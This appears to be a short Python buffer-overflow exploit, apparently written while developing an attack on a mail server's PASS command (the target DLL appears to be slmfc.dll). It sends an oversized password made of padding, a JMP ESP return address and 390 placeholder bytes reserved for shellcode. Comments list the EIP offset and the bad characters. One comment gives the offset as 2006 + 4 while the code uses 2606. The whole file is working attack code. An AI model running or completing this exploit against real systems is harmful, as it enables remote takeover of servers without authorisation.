#!/usr/bin/python

import socket
import sys

# EIP: 2006 + 4
# ESP: 390 bytes p/ shellcode
# EIP -> ESP == shellcode


# shell32.dll - 7C9D30D7 (JMP ESP)
# !mona modules
# slmfc.dll - 5F4A358F

### characters not accepted
##### \x00, \x0a, \x0d, \x20

def main():
	bytes = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390

	print("Fuzzing: " + str(len(bytes)))

	sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sck.connect((sys.argv[1], int(sys.argv[2])))

	sck.recv(1024)
	sck.send("USER teste\r\n")
	sck.recv(1024)
	sck.send("PASS " + bytes + "\r\n")
	sck.recv(1024)

try:
	main()
except Exception as e:
	print(str(e))